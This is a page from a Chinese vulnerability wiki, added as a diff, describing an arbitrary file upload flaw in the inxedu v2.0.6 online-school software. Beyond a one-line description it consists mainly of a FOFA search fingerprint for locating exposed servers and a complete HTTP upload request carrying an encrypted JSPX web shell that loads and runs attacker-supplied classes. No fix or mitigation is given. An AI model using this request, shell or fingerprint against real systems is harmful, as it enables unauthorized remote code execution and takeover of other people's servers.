@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%9B%A0%E9%85%B7%E6%95%99%E8%82%B2%E8%BD%AF%E4%BB%B6/%E5%9B%A0%E9%85%B7%E6%95%99%E8%82%B2%E8%BD%AF%E4%BB%B6%E5%BC%80%E6%BA%90%E7%BD%91%E6%A0%A1%E7%A8%8B%E5%BA%8Fgok4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>因酷教育软件开源网校程序gok4任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u56e0\u9177\u6559\u80b2\u8f6f\u4ef6\u5f00\u6e90\u7f51\u6821\u7a0b\u5e8fgok4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        图创软件 图书馆站群管理系统 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%9B%9B%E5%B7%9D%E9%B1%BC%E5%B0%BE%E5%B7%B4%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E5%8C%BB%E7%96%97%E5%AE%89%E5%85%A8%28%E4%B8%8D%E8%89%AF%29%E4%BA%8B%E4%BB%B6%E6%8A%A5%E5%91%8A%E7%B3%BB%E7%BB%9Fmembers%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%9B%9B%E5%B7%9D%E9%B1%BC%E5%B0%BE%E5%B7%B4%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E5%8C%BB%E7%96%97%E5%AE%89%E5%85%A8%28%E4%B8%8D%E8%89%AF%29%E4%BA%8B%E4%BB%B6%E6%8A%A5%E5%91%8A%E7%B3%BB%E7%BB%9Fmembers%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        医疗安全(不良)事件报告系统members存在信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="gok4">因酷教育软件开源网校程序gok4任意文件上传漏洞<a class="headerlink" href="#gok4" title="Permanent link">&para;</a></h2>
+<p>inxedu v2.0.6组件controllerlmageUploadcontroller.class中的任意文件上传漏洞允许攻击者通过上传精心制作的jsp文件执行任意代码。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>icon_hash=&quot;500708606&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST<span class="w"> </span>/image/gok4?<span class="p">&amp;</span><span class="nv">param</span><span class="o">=</span>image<span class="p">&amp;</span><span class="nv">fileType</span><span class="o">=</span>jpg,gif,png,jpeg,jspx<span class="p">&amp;</span><span class="nv">pressText</span><span class="o">=</span>undefined<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span><span class="m">127</span>.0.0.1:8080
+User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>NT<span class="w"> </span><span class="m">10</span>.0<span class="p">;</span><span class="w"> </span>Win64<span class="p">;</span><span class="w"> </span>x64<span class="p">;</span><span class="w"> </span>rv:125.0<span class="o">)</span><span class="w"> </span>Gecko/20100101<span class="w"> </span>Firefox/125.0
+Accept:<span class="w"> </span>text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.9,image/avif,image/webp,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8
+Accept-Language:<span class="w"> </span>zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span><span class="m">0</span>.2
+Accept-Encoding:<span class="w"> </span>gzip,<span class="w"> </span>deflate
+Content-Type:<span class="w"> </span>multipart/form-data<span class="p">;</span><span class="w"> </span><span class="nv">boundary</span><span class="o">=</span>---------------------------1193235141139104622277612664
+Content-Length:<span class="w"> </span><span class="m">883</span>
+Origin:<span class="w"> </span>http://127.0.0.1:8080
+Connection:<span class="w"> </span>close
+Referer:<span class="w"> </span>http://127.0.0.1:8080/admin/website/doAddImages
+Cookie:<span class="w"> </span><span class="nv">JSESSIONID</span><span class="o">=</span>10EC81B49E27265587A446F32099DBE3<span class="p">;</span><span class="w"> </span><span class="nv">inxedulogin_sys_user_</span><span class="o">=</span>inxedulogin_sys_user_1
+Upgrade-Insecure-Requests:<span class="w"> </span><span class="m">1</span>
+Sec-Fetch-Dest:<span class="w"> </span>iframe
+Sec-Fetch-Mode:<span class="w"> </span>navigate
+Sec-Fetch-Site:<span class="w"> </span>same-origin
+Sec-Fetch-User:<span class="w"> </span>?1
+
+-----------------------------1193235141139104622277612664
+Content-Disposition:<span class="w"> </span>form-data<span class="p">;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;uploadfile&quot;</span><span class="p">;</span><span class="w"> </span><span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;1.jspx&quot;</span>
+Content-Type:<span class="w"> </span>image/jpeg
+
+&lt;jsp:root<span class="w"> </span>xmlns:jsp<span class="o">=</span><span class="s2">&quot;http://java.sun.com/JSP/Page&quot;</span><span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.2&quot;</span>&gt;&lt;jsp:directive.page<span class="w"> </span><span class="nv">import</span><span class="o">=</span><span class="s2">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>/&gt;&lt;jsp:declaration&gt;<span class="w"> </span>class<span class="w"> </span>U<span class="w"> </span>extends<span class="w"> </span>ClassLoader<span class="o">{</span>U<span class="o">(</span>ClassLoader<span class="w"> </span>c<span class="o">){</span>super<span class="o">(</span>c<span class="o">)</span><span class="p">;</span><span class="o">}</span>public<span class="w"> </span>Class<span class="w"> </span>g<span class="o">(</span>byte<span class="w"> </span><span class="o">[]</span>b<span class="o">){</span><span class="k">return</span><span class="w"> </span>super.defineClass<span class="o">(</span>b,0,b.length<span class="o">)</span><span class="p">;</span><span class="o">}}</span>&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String<span class="w"> </span><span class="nv">k</span><span class="o">=</span><span class="s2">&quot;e45e329feb5d925b&quot;</span><span class="p">;</span>session.putValue<span class="o">(</span><span class="s2">&quot;u&quot;</span>,k<span class="o">)</span><span class="p">;</span>Cipher<span class="w"> </span><span class="nv">c</span><span class="o">=</span>Cipher.getInstance<span class="o">(</span><span class="s2">&quot;AES&quot;</span><span class="o">)</span><span class="p">;</span>c.init<span class="o">(</span><span class="m">2</span>,new<span class="w"> </span>SecretKeySpec<span class="o">((</span>session.getValue<span class="o">(</span><span class="s2">&quot;u&quot;</span><span class="o">)</span>+<span class="s2">&quot;&quot;</span><span class="o">)</span>.getBytes<span class="o">()</span>,<span class="s2">&quot;AES&quot;</span><span class="o">))</span><span class="p">;</span>new<span class="w"> </span>U<span class="o">(</span>this.getClass<span class="o">()</span>.getClassLoader<span class="o">())</span>.g<span class="o">(</span>c.doFinal<span class="o">(</span>new<span class="w"> </span>sun.misc.BASE64Decoder<span class="o">()</span>.decodeBuffer<span class="o">(</span>request.getReader<span class="o">()</span>.readLine<span class="o">())))</span>.newInstance<span class="o">()</span>.equals<span class="o">(</span>pageContext<span class="o">)</span><span class="p">;</span>&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;
+-----------------------------1193235141139104622277612664--
+</code></pre></div>
+<p><img alt="image-20240527192638132" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405271926196.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        图创软件 图书馆站群管理系统 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%9B%9B%E5%B7%9D%E9%B1%BC%E5%B0%BE%E5%B7%B4%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E5%8C%BB%E7%96%97%E5%AE%89%E5%85%A8%28%E4%B8%8D%E8%89%AF%29%E4%BA%8B%E4%BB%B6%E6%8A%A5%E5%91%8A%E7%B3%BB%E7%BB%9Fmembers%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%9B%9B%E5%B7%9D%E9%B1%BC%E5%B0%BE%E5%B7%B4%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E5%8C%BB%E7%96%97%E5%AE%89%E5%85%A8%28%E4%B8%8D%E8%89%AF%29%E4%BA%8B%E4%BB%B6%E6%8A%A5%E5%91%8A%E7%B3%BB%E7%BB%9Fmembers%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        医疗安全(不良)事件报告系统members存在信息泄露漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
